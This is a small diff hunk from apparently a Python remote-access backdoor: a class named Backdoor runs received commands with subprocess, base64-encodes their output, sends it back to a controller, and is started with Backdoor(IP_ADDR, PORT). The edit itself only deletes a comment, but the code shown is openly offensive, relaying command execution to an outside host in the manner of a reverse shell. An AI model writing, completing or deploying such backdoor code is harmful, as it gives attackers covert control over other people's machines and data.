@@ -99,7 +99,7 @@ class Backdoor:
                 except subprocess.CalledProcessError:
                     output = b'[-] Wrong command entered'
 
-            self.reliable_send(base64.b64encode(output).decode()) # here we converted the output to string
+            self.reliable_send(base64.b64encode(output).decode())
 
 my_backdoor = Backdoor(IP_ADDR, PORT)
 my_backdoor.start()
